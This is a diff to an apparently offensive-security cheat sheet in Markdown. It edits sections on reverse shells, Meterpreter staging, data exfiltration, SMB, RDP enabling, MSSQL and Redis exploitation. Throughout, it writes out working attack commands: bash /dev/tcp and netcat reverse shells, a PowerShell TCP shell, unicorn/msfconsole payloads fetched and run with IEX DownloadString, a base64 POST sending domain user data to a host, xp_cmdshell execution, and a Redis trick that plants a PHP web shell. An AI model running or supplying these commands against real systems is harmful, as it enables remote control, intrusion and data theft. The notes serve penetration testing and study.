@@ -23,7 +23,7 @@
 ## Bash
 
 ```
-$ bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
+$ /bin/bash -c '/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
 $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
 ```
 
@@ -64,24 +64,6 @@ $ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_ST
 
 ## PowerShell
 
-Invoke-Expression (UTF-16LE):
-
-1. [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
-
-```
-$ echo -n "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/[1]')" | iconv -t UTF-16LE | base64 -w0; echo
-PS > powershell -NoP -EncodedCommand <BASE64_COMMAND_HERE>
-```
-
-Invoke-WebRequest + `nc.exe` **[1]**:
-
-1. [https://eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)
-
-```
-PS > powershell -NoP IWR -Uri http://127.0.0.1/nc.exe -OutFile C:\Windows\Temp\nc.exe
-PS > cmd /c C:\Windows\Temp\nc.exe 127.0.0.1 1337 -e powershell
-```
-
 System.Net.Sockets.TCPClient:
 
 ```
@@ -93,24 +75,16 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.13.37",1337);$stream = 
 
 ## Meterpreter
 
-PowerShell + msfvenom:
+
+
+### unicorn
+
+* [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=127.0.0.1 LPORT=1337 -f exe > met.exe
-PS > (New-Object Net.WebClient).DownloadFile("met.exe", "$env:TEMP\met.exe")
-...start metasploit listener...
-PS > Start-Process "$env:TEMP\met.exe"
-```
-
-PowerShell + unicorn **[1]**:
-
-1. [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
-
-```
-$ ./unicorn.py windows/meterpreter/reverse_https LHOST 443
-$ service postgresql start
-$ msfconsole -r unicorn.rc
-PS > powershell -NoP IEX (New-Object Net.WebClient).DownloadString('powershell_attack.txt')
+$ ./unicorn.py windows/meterpreter/reverse_https 10.10.13.37 443
+$ sudo msfconsole -qr unicorn.rc
+PS > IEX(New-Object Net.WebClient).DownloadString('powershell_attack.txt')
 ```
 
 
@@ -121,19 +95,6 @@ PS > powershell -NoP IEX (New-Object Net.WebClient).DownloadString('powershell_a
 ```
 $ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
 ```
-
-
-
-### pwncat
-
-* [https://github.com/cytopia/pwncat](https://github.com/cytopia/pwncat)
-* [https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/](https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/)
-
-
-
-### xc
-
-* [https://github.com/xct/xc](https://github.com/xct/xc)
 
 
 
@@ -203,7 +164,7 @@ Local string to base64 and POST:
 ```
 PS > $str = cmd /c net user /domain
 PS > $base64str = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
-PS > Invoke-RestMethod -Uri http://127.0.0.1/msg -Method POST -Body $base64str
+PS > IWR -Uri http://127.0.0.1/msg -Method POST -Body $base64str
 ```
 
 
@@ -291,13 +252,11 @@ PS > [IO.File]::WriteAllBytes("C:\inetpub\wwwroot\uploads\tunnel.aspx", [Convert
 
 #### smbserver.py
 
-SMB server (communicate with Windows **[1]**):
+Start SMB server:
 
 ```
 $ smbserver.py -smb2support files `pwd`
 ```
-
-1. [https://serverfault.com/a/333584/554483](https://serverfault.com/a/333584/554483)
 
 Mount SMB in Windows with `net use`:
 
@@ -1793,19 +1752,20 @@ PS > robocopy /B W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit
 ## RDP
 
 * [https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop](https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop)
+* [https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3](https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3)
 * [https://swarm.ptsecurity.com/remote-desktop-services-shadowing/](https://swarm.ptsecurity.com/remote-desktop-services-shadowing/)
 
 
 
 ### Enable RDP
 
-Enable RDP from meterpreter:
+From meterpreter:
 
 ```
 meterpreter > run getgui -e
 ```
 
-Enable RDP from PowerShell:
+From PowerShell:
 
 ```
 PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
@@ -3450,8 +3410,6 @@ $ python3 odat.py tnspoison -s 10.10.13.37 -d CLREXTPROC --poison
 2> GO
 1> RECONFIGURE
 2> GO
-1> EXEC sp_configure 'xp_cmdshell', 1
-2> GO
 1> xp_cmdshell 'whoami'
 2> GO
 ```
@@ -3516,23 +3474,10 @@ SELECT username,password FROM secret_database;
 
 * [https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)
 * [2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
+* [https://github.com/holys/redis-cli/releases](https://github.com/holys/redis-cli/releases)
+* [https://github.com/antirez/redis](https://github.com/antirez/redis)
 
-
-
-### Preparation
-
-Install **[1]** or **[2]**:
-
-```
-$ mkdir ~/tools/redis-cli-go && cd ~/tools/redis-cli-go
-$ wget [1] -O redis-cli-go && chmod +x redis-cli-go
-$ ln -s ~/tools/redis-cli-go/redis-cli-go /usr/local/bin/redis-cli-go && cd -
-```
-
-1. [https://github.com/holys/redis-cli/releases](https://github.com/holys/redis-cli/releases)
-2. [https://github.com/antirez/redis](https://github.com/antirez/redis)
-
-Check if vulnarable:
+Check for anonymous login:
 
 ```
 $ nc 127.0.0.1 6379
@@ -3549,6 +3494,8 @@ Connection closed by foreign host.
 
 ### Web Shell
 
+* [https://book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)
+
 ```
 $ redis-cli -h 127.0.0.1 flushall
 $ redis-cli -h 127.0.0.1 set pwn '<?php system($_REQUEST['cmd']); ?>'
@@ -3556,8 +3503,6 @@ $ redis-cli -h 127.0.0.1 config set dbfilename shell.php
 $ redis-cli -h 127.0.0.1 config set dir /var/www/html/
 $ redis-cli -h 127.0.0.1 save
 ```
-
-* [https://book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)
 
 
 
